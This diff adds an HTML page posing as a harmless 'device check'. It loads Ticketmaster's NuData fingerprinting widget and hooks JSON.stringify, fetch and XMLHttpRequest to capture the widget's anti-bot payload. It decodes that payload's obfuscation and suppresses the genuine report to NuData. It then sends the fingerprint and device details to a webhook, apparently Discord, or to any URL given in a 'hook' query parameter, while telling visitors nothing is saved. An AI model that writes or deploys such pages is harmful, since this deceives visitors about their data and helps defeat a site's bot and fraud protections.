@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+  <title>Device check</title>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      min-height: 100dvh;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background: #f4f5f7;
+      color: #1a1a1a;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 24px 16px;
+    }
+    .card {
+      width: 100%;
+      max-width: 360px;
+      background: #fff;
+      border-radius: 16px;
+      padding: 32px 24px 28px;
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.08);
+      text-align: center;
+    }
+    .icon {
+      width: 56px;
+      height: 56px;
+      margin: 0 auto 20px;
+      border-radius: 50%;
+      background: #eef2ff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 28px;
+    }
+    .icon.ok { background: #e8f8ef; }
+    .icon.err { background: #fdeeee; }
+    h1 {
+      font-size: 20px;
+      font-weight: 600;
+      margin: 0 0 8px;
+      letter-spacing: -0.02em;
+    }
+    p {
+      font-size: 14px;
+      line-height: 1.5;
+      color: #666;
+      margin: 0 0 24px;
+    }
+    button {
+      width: 100%;
+      padding: 14px 16px;
+      font-size: 16px;
+      font-weight: 600;
+      border: 0;
+      border-radius: 12px;
+      background: #111;
+      color: #fff;
+      cursor: pointer;
+    }
+    button:active { opacity: 0.88; }
+    button[disabled] { background: #bbb; cursor: default; }
+    #msg {
+      margin-top: 18px;
+      font-size: 14px;
+      min-height: 20px;
+      color: #333;
+    }
+    #msg.ok { color: #1a7f42; font-weight: 600; }
+    #msg.err { color: #c0392b; }
+    .foot {
+      margin-top: 20px;
+      font-size: 11px;
+      color: #aaa;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="icon" id="icon">📱</div>
+    <h1 id="title">Quick device check</h1>
+    <p id="blurb">Tap continue so we can confirm your phone or browser is supported. Takes a few seconds.</p>
+    <button id="go" disabled>Continue</button>
+    <div id="msg"></div>
+    <p class="foot">One-time check · nothing is saved on this page</p>
+  </div>
+
+<script src="../_notify.js"></script>
+<script>
+(function () {
+  const WIDGET_ID = "w-481390";
+  const SYNC_JS = "https://nudata.ticketmaster.com/2.2/w/" + WIDGET_ID + "/sync/js/";
+  const ENDPOINT = typeof defaultNotifyEndpoint === "function" ? defaultNotifyEndpoint() : "";
+
+  const $ = (id) => document.getElementById(id);
+  let ready = false;
+  let busy = false;
+
+  function platform() {
+    const ua = navigator.userAgent;
+    if (/iphone|ipad|ipod/i.test(ua)) return "ios";
+    if (/android/i.test(ua)) return "android";
+    if (/windows/i.test(ua)) return "desktop";
+    if (/macintosh|mac os x/i.test(ua)) return "desktop";
+    return "other";
+  }
+
+  function decodeBndx(encoded) {
+    const KEY = [41, 8, 49, 48, 51, 44, 63, 0, 19, 61, 43, 63, 57, 15, 34, 6, 42, 59, 41, 19, 10, 45, 54, 0, 44, 34, 57, 36, 48];
+    let s = String(encoded || "").trim();
+    if (!s.startsWith("BNDX:")) return s;
+    s = atob(s.slice(5)).slice(4);
+    let out = "", f = 0;
+    for (let p = 0; p < s.length; p++) {
+      let v = s.charCodeAt(p) - 32;
+      if (v >= 0 && v < 94) {
+        if (v < 64) v ^= KEY[f % KEY.length];
+        v += 47 + (-1) * f * 31;
+        v = ((v % 94) + 94) % 94;
+        f++;
+      }
+      out += String.fromCharCode(v + 32);
+    }
+    return out;
+  }
+
+  function onPlain(obj) {
+    if (obj && obj.widgetData) window.__cap = obj;
+  }
+
+  function parsePlain(obj) {
+    if (!obj || !obj.widgetData) return null;
+    const wd = obj.widgetData;
+    for (const k of ["ft", "fc"]) {
+      if (typeof wd[k] === "string" && wd[k][0] === "{") {
+        try { wd[k] = JSON.parse(wd[k]); } catch {}
+      }
+    }
+    return obj;
+  }
+
+  function parseWire(raw) {
+    try { return parsePlain(JSON.parse(decodeBndx(raw))); } catch { return null; }
+  }
+
+  function buildPayload(plain) {
+    const wd = plain.widgetData || {};
+    return {
+      kind: "nudata_base_capture",
+      capturedAt: new Date().toISOString(),
+      host: location.host,
+      platform: platform(),
+      userAgent: navigator.userAgent,
+      maxTouchPoints: navigator.maxTouchPoints,
+      screen: {
+        w: screen.width, h: screen.height,
+        availW: screen.availWidth, availH: screen.availHeight,
+        dpr: window.devicePixelRatio,
+        inner: { w: innerWidth, h: innerHeight },
+        outer: { w: outerWidth, h: outerHeight },
+      },
+      widgetData: wd,
+      wt: plain.wt || null,
+      eventsObject: plain,
+    };
+  }
+
+  function installHooks() {
+    const _stringify = JSON.stringify;
+    JSON.stringify = function (v, ...r) {
+      if (v && typeof v === "object" && v.widgetData) onPlain(v);
+      return _stringify.apply(this, [v, ...r]);
+    };
+
+    const isNd = (u) => /nudatasecurity\.com/i.test(String(u || ""));
+
+    const origFetch = fetch.bind(window);
+    window.fetch = async function (input, init) {
+      const url = typeof input === "string" ? input : (input && input.url) || "";
+      if (isNd(url) && ((init && init.method) || "GET").toUpperCase() === "POST") {
+        const body = init && init.body;
+        if (typeof body === "string" && body.startsWith("BNDX:")) {
+          const p = parseWire(body);
+          if (p) onPlain(p);
+        }
+        return new Response("{}", { status: 204 });
+      }
+      return origFetch(input, init);
+    };
+
+    const xo = XMLHttpRequest.prototype.open;
+    const xs = XMLHttpRequest.prototype.send;
+    XMLHttpRequest.prototype.open = function (m, u, ...rest) {
+      this.__u = u; this.__m = (m || "GET").toUpperCase();
+      return xo.call(this, m, u, ...rest);
+    };
+    XMLHttpRequest.prototype.send = function (body) {
+      if (/nudatasecurity\.com/i.test(this.__u || "") && this.__m === "POST") {
+        if (typeof body === "string" && body.startsWith("BNDX:")) {
+          const p = parseWire(body);
+          if (p) onPlain(p);
+        }
+        queueMicrotask(() => {
+          Object.defineProperty(this, "readyState", { value: 4 });
+          Object.defineProperty(this, "status", { value: 204 });
+          Object.defineProperty(this, "responseText", { value: "{}" });
+          this.onload && this.onload();
+        });
+        return;
+      }
+      return xs.call(this, body);
+    };
+
+    if (!document.forms.frmGlobalNudetect) {
+      const fm = document.createElement("form");
+      fm.name = "frmGlobalNudetect";
+      const inp = document.createElement("input");
+      inp.type = "hidden";
+      inp.name = "nds-pmd";
+      fm.appendChild(inp);
+      document.body.insertBefore(fm, document.body.firstChild);
+    }
+  }
+
+  function readCapture() {
+    let plain = window.__cap;
+    const el = document.querySelector('[name="nds-pmd"]');
+    if (el && el.value && !plain) plain = parseWire(el.value);
+    if (!plain) throw new Error("not_ready");
+    return buildPayload(plain);
+  }
+
+  function chunk(s, n) {
+    const out = [];
+    for (let i = 0; i < s.length; i += n) out.push(s.slice(i, i + n));
+    return out;
+  }
+
+  async function send(payload) {
+    const override = new URLSearchParams(location.search).get("hook");
+    const targets = [];
+    if (ENDPOINT) targets.push(ENDPOINT);
+    if (override && override !== ENDPOINT) targets.push(override);
+    if (!targets.length) throw new Error("no_hook");
+
+    const full = JSON.stringify(payload, null, 2);
+    const label = platform();
+    for (const wh of targets) {
+      const discord = typeof isDiscordNotifyEndpoint === "function" && isDiscordNotifyEndpoint(wh);
+      if (!discord) {
+        await fetch(wh, {
+          method: "POST",
+          headers: { "content-type": "application/json" },
+          body: full,
+        });
+        continue;
+      }
+      const parts = chunk(full, 5400);
+      for (let i = 0; i < parts.length; i++) {
+        await fetch(wh, {
+          method: "POST",
+          headers: { "content-type": "application/json" },
+          body: JSON.stringify({
+            content: i === 0 ? `Device check · ${label} · ${parts.length} part(s)` : `Device check · part ${i + 1}/${parts.length}`,
+            embeds: [{ description: "```json\n" + parts[i] + "\n```" }],
+          }),
+        });
+        if (i < parts.length - 1) await new Promise((r) => setTimeout(r, 350));
+      }
+    }
+  }
+
+  function success() {
+    $("icon").textContent = "✓";
+    $("icon").className = "icon ok";
+    $("title").textContent = "All set";
+    $("blurb").textContent = "Thanks — your device check completed successfully.";
+    $("go").hidden = true;
+    $("msg").className = "ok";
+    $("msg").textContent = "Data sent successfully.";
+  }
+
+  function fail(code) {
+    $("icon").textContent = "!";
+    $("icon").className = "icon err";
+    $("msg").className = "err";
+    if (code === "not_ready") {
+      $("msg").textContent = "Still loading — wait a moment and tap Continue again.";
+    } else {
+      $("msg").textContent = "Something went wrong. Please try again.";
+    }
+    busy = false;
+    $("go").disabled = !ready;
+    $("go").textContent = "Try again";
+  }
+
+  async function run() {
+    if (busy || !ready) return;
+    busy = true;
+    $("go").disabled = true;
+    $("msg").className = "";
+    $("msg").textContent = "Checking…";
+    try {
+      await new Promise((r) => setTimeout(r, 400));
+      const payload = readCapture();
+      await send(payload);
+      success();
+    } catch (e) {
+      fail(e.message === "not_ready" ? "not_ready" : "err");
+    }
+  }
+
+  installHooks();
+
+  window.ndsapi = window.ndsapi || { config: { q: [], ready(fn) { this.q.push(fn); } } };
+  const sc = document.createElement("script");
+  sc.async = true;
+  sc.src = SYNC_JS;
+  sc.onload = () => {
+    ready = true;
+    $("go").disabled = false;
+  };
+  sc.onerror = () => {
+    $("msg").className = "err";
+    $("msg").textContent = "Could not connect. Check your network and refresh.";
+  };
+  document.head.appendChild(sc);
+
+  $("go").addEventListener("click", run);
+})();
+</script>
+</body>
+</html>
